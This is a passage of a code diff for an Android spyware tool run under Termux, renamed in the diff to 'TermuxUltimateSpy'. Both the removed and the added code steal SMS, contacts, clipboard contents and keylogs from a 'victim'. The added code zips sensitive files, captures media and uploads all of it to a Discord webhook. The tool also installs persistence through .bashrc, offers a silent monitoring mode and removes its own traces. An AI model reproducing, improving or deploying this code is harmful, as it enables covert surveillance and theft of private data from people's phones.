-                        print(f"  Body: {msg.get('body', 'N/A')[:50]}...")
-                elif command == 'contacts':
-                    contacts = self.steal_contacts()
-                    print(f"Found {len(contacts)} contacts")
-                    for contact in contacts[:3]:
-                        print(f"  Name: {contact.get('name', 'N/A')}")
-                        print(f"  Number: {contact.get('number', 'N/A')}")
-                elif command == 'clipboard':
-                    clipboard = self.get_clipboard()
-                    print(f"Clipboard: {clipboard[:100]}...")
-                elif command == 'keylog':
-                    keylog_file = os.path.join(TERMUX_PATHS['home'], '.keylog.txt')
-                    if os.path.exists(keylog_file):
-                        with open(keylog_file, 'r') as f:
-                            content = f.read()[-1000:]
-                        print(f"Keylog (last 1000 chars):\n{content}")
-                    else:
-                        print("Keylog file not found")
-                else:
-                    print(f"Unknown command: {command}")
-                    
-            except KeyboardInterrupt:
-                print("\nExiting...")
-                break
-            except Exception as e:
-                print(f"Error: {e}")
+        # Send startup message
+        embed = {
+            'title': '⚡ Quick Exfiltration Started',
+            'description': f'Victim ID: `{VICTIM_ID}`',
+            'color': 0xFF0000,
+            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ')
+        }
+        self.send_webhook(embed=embed)
+        
+        # 1. System info
+        print("[1/5] System info...")
+        system_info = self.gather_comprehensive_info()
+        self.send_large_data(json.dumps(system_info, indent=2), "System Information")
+        
+        # 2. Files
+        print("[2/5] Finding files...")
+        files = self.find_sensitive_files()[:15]
+        if files:
+            zip_buffer = self.create_smart_zip(files)
+            zip_path = os.path.join(TERMUX_PATHS['home'], 'quick_exfil.zip')
+            with open(zip_path, 'wb') as f:
+                f.write(zip_buffer.read())
+            self.send_file_discord(zip_path, "sensitive_files.zip")
+            os.remove(zip_path)
+        
+        # 3. Media
+        print("[3/5] Capturing media...")
+        media_files = self.capture_media()[:3]
+        for media_type, media_path in media_files:
+            self.send_file_discord(media_path, os.path.basename(media_path))
+        
+        # 4. Communications
+        print("[4/5] Communications...")
+        comm_data = self.steal_communications()
+        if comm_data:
+            self.send_large_data(json.dumps(comm_data, indent=2), "Communications Data")
+        
+        # 5. Environment
+        print("[5/5] Environment...")
+        recordings = self.record_environment()
+        if 'clipboard' in recordings:
+            embed = {
+                'title': '📋 Clipboard Snapshot',
+                'description': f'```{recordings["clipboard"]}```',
+                'color': 0x3498DB
+            }
+            self.send_webhook(embed=embed)
+        
+        print("[+] Quick exfiltration completed!")
 
 def main():
     """Main entry point"""
-    # Check if running in Termux
+    # Check Termux
     if not os.path.exists('/data/data/com.termux'):
-        print("[-] This tool is designed for Termux on Android only!")
-        print("[-] Some features may not work properly")
+        print("[-] This tool requires Termux on Android!")
+        sys.exit(1)
     
-    tool = TermuxInfiltrationTool()
+    spy = TermuxUltimateSpy()
     
-    # Check for command line arguments
     if len(sys.argv) > 1:
-        if sys.argv[1] == '--daemon':
-            tool.run_surveillance()
-        elif sys.argv[1] == '--persistence':
-            tool.establish_persistence()
+        if sys.argv[1] == '--quick':
+            spy.quick_exfiltration()
+        elif sys.argv[1] == '--persist':
+            spy.establish_persistence()
             print("[+] Persistence installed")
-        elif sys.argv[1] == '--info':
-            info = tool.gather_system_info()
-            print(json.dumps(info, indent=2))
-        elif sys.argv[1] == '--files':
-            files = tool.exfiltrate_files()
-            print(f"Found {len(files)} files")
-            for f in files:
-                print(f"{f['path']} - {f['size']} bytes")
+        elif sys.argv[1] == '--silent':
+            spy.start_comprehensive_monitoring()
         elif sys.argv[1] == '--clean':
-            # Remove persistence
-            try:
-                bashrc_path = os.path.join(TERMUX_PATHS['home'], '.bashrc')
-                if os.path.exists(bashrc_path):
-                    with open(bashrc_path, 'r') as f:
-                        lines = f.readlines()
-                    with open(bashrc_path, 'w') as f:
-                        for line in lines:
-                            if 'python3' not in line or 'termux/boot' not in line:
-                                f.write(line)
-                print("[+] Cleanup completed")
-            except Exception as e:
-                print(f"[-] Cleanup error: {e}")
+            # Cleanup
+            bashrc = os.path.join(TERMUX_PATHS['home'], '.bashrc')
+            if os.path.exists(bashrc):
+                with open(bashrc, 'r') as f:
+                    lines = f.readlines()
+                with open(bashrc, 'w') as f:
+                    for line in lines:
+                        if 'python3' not in line or 'nohup' not in line:
+                            f.write(line)
+            print("[+] Cleanup completed")
+        else:
+            print("Usage:")
+            print("  python3 termux_spy.py --quick     # One-time exfiltration")
+            print("  python3 termux_spy.py --persist   # Install persistence")
+            print("  python3 termux_spy.py --silent    # Start monitoring")
+            print("  python3 termux_spy.py --clean     # Remove traces")
     else:
         # Interactive mode
-        tool.interactive_mode()
+        print("\n" + "="*60)
+        print("TERMUX SPY ULTIMATE v2.0")
+        print("="*60)
+        print(f"Victim ID: {VICTIM_ID}")
+        print(f"Webhook: {WEBHOOK_URL[:40]}...")
+        print("\nOptions:")
+        print("  1. Quick exfiltration (one-time)")
+        print("  2. Install persistence")
+        print("  3. Start silent monitoring")
+        print("  4. Clean traces")
+        print("  5. Test webhook")
+        print("  6. Exit")
+        
+        choice = input("\nSelect option (1-6): ").strip()
+        
+        if choice == '1':
+            spy.quick_exfiltration()
+        elif choice == '2':
+            spy.establish_persistence()
+        elif choice == '3':
+            spy.start_comprehensive_monitoring()
+        elif choice == '4':
+            # Cleanup code
+            pass
+        elif choice == '5':
+            embed = {
+                'title': '✅ Webhook Test',
+                'description': 'Termux Spy Ultimate is working!',
+                'color': 0x00FF00
+            }
+            spy.send_webhook(embed=embed)
+            print("[+] Test message sent!")
+        elif choice == '6':
+            print("[+] Exiting...")
+        else:
+            print("[-] Invalid choice")
 
 if __name__ == "__main__":
+    # Required packages check
+    required = ['requests']
+    for package in required:
+        try:
+            __import__(package.replace('-', '_'))
+        except ImportError:
+            print(f"[!] Please install: pip install {package}")
+    
     main()
